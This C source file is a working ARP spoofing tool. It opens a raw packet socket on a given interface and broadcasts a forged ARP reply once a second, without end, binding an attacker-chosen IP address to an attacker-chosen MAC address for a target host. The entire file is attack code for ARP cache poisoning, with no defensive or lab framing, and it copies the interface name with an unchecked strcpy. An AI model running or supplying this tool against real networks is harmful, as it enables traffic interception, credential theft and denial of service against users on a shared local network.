#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "arplib.h"

enum {
	ARGV_CMD, 
	ARGV_INTERFACE, 
	ARGV_TARGET_IP, 
	ARGV_SPOOF_IP, 
	ARGV_SPOOF_MAC
};

int main(int argc, char **argv)
{
	struct sockaddr_ll sll;
	struct ifreq ifr;
	struct arp_packet arp_packet;
	int sock, arp_source_ip, arp_target_ip;

	unsigned char buffer_mac[6];
	unsigned char anymac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};	
	unsigned char *arp_source_mac, *ether_source_mac, *ether_dest_mac;

	if(argc != 5) {
		printf("Usage : %s [interface] [Target IP] [IP] [MAC]\n", argv[0]);
		return 1;
	}

	if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		perror("socket");
		return 1;
	}

	memset(&ifr, 0x00, sizeof(ifr));

	strcpy(ifr.ifr_name, argv[1]);
	if(ioctl(sock, SIOCGIFINDEX, &ifr) < 0 ) {
		perror("ioctl ");
		return 1;
	}

	memset(&sll, 0x00, sizeof(sll));
	sll.sll_family = PF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);

	arp_source_ip = inet_addr(argv[ARGV_SPOOF_IP]);
	arp_target_ip = inet_addr(argv[ARGV_TARGET_IP]);

	strmac_to_buffer(argv[ARGV_SPOOF_MAC], buffer_mac);

	ether_dest_mac = anymac;
	ether_source_mac = arp_source_mac = buffer_mac;

	make_ether_header(
			&(arp_packet.ether_header), 
			ether_dest_mac, ether_source_mac, ETHERTYPE_ARP);

	make_arp_header(
			&(arp_packet.ether_arp), arp_source_mac, arp_source_ip,
			NULL, arp_target_ip, 1);

	while(1) {
		if(sendto(sock, &arp_packet, sizeof(arp_packet), 0, 
			(struct sockaddr *)&sll, sizeof(sll)) < 0) {

			perror("sendto ");
			break;
		}

		sleep(1);
	}

	return 0;
}				
